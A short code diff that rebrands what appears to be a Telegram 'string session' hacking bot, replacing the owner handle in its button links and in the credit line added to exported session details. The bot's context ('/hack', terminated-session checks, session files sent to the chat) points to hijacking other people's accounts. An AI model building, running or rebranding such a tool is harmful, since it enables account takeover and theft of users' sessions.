@@ -424,7 +424,7 @@ keyboard = [
     Button.inline("M", data="M")
     ],
   [
-    Button.url("Owner", "https://t.me/LegendBoy_XD")
+    Button.url("Owner", "https://t.me/Mr_Professor_Agora")
     ]
 ]
 
@@ -481,7 +481,7 @@ async def start(event):
         Button.inline("M", data="M")
         ],
       [
-        Button.url("Owner", "https://t.me/LegendBoy_XD")
+        Button.url("Owner", "https://t.me/Mr_Professor_Agora")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -502,7 +502,7 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @LegendBoy_XD")
+        file.write(i + "\n\nDetails BY @Mr_Professor_Agora")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
